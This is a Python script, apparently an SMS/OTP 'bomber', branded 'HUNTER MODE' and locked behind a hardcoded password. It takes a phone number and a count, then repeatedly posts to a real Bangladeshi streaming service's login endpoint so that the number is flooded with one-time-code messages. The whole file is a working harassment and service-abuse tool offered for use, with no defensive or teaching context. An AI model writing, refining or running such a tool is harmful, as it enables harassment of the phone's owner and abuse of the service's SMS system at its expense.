import requests
import time
import os
import signal
from requests.exceptions import RequestException, ConnectionError, Timeout

# --- Handle CTRL+C to Exit ---
def signal_handler(sig, frame):
    print("\n\n\033[1;31m[-] Stopping the tool... Good Bye! \033[0m")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)

# --- Password Protection ---
def check_password():
    os.system('clear')
    correct_pass = "saeid9.90"  # আপনার দেওয়া পাসওয়ার্ড
    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    print("\033[1;33m          🔐 SECURITY CHECK 🔐\033[0m")
    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    
    user_pass = input("\033[1;34m[?] Enter Password to Access: \033[0m")
    
    if user_pass == correct_pass:
        print("\033[1;32m\n✅ Access Granted! Welcome @saeid9.90\033[0m")
        time.sleep(2)
        return True
    else:
        print("\033[1;31m\n❌ Access Denied! Wrong Password.\033[0m")
        time.sleep(2)
        exit()

# --- Professional Large Banner ---
def show_banner():
    os.system('clear')
    large_banner = """
\033[1;32m
██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗██╔════╝
██╔████╔██║██║   ██║██║   ██║█████╗  
██║╚██╔╝██║██║   ██║██║   ██║██╔══╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
\033[1;36m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;33m  🌟 Developed by : @saeid9.90
\033[1;33m  🚀 Tool Version : 2.0 (Pro)
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[0m
    """
    print(large_banner)

TARGET_API = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
DELAY_SECONDS = 2  

def send_continuous_requests_fast():
    check_password() # পাসওয়ার্ড চেক করবে
    show_banner()
    
    while True:
        user_number = input("\033[1;34m👤 Enter Phone Number (e.g., 01xxxxxxxxx): \033[0m").strip()
        if user_number.isdigit() and len(user_number) >= 11:
            break
        else:
            print("\033[1;31m❌ Invalid Number! Try again. \033[0m")

    while True:
        try:
            amount = int(input("\033[1;34m🔢 Number of requests? : \033[0m"))
            if amount > 0: break
        except ValueError:
            print("\033[1;31m❌ Enter a valid number. \033[0m")
            
    print(f"\n\033[1;32m🚀 Starting requests for {user_number}... \033[0m\n")
    
    success_count = 0
    fail_count = 0

    for i in range(amount):
        request_number = i + 1
        try:
            print(f"\033[1;36m[{request_number}/{amount}] Sending request...", end="\r")
            response = requests.post(TARGET_API, json={"country": "BD", "platform": "web", "language": "en", "number": user_number, "operator": "bd-otp-test"}, timeout=10)
            
            if response.status_code == 200:
                print(f"✅ Request {request_number} sent!      ")
                success_count += 1
            else:
                print(f"⚠️ Request {request_number} failed.      ")
                fail_count += 1

            if request_number < amount:
                time.sleep(DELAY_SECONDS)
            
        except:
            print(f"\n\033[1;31m❌ Error occurred. \033[0m")
            break

    print("\n\033[1;32m✅ Done! Success: {} | Failed: {}\033[0m".format(success_count, fail_count))

if __name__ == "__main__":
    send_continuous_requests_fast()
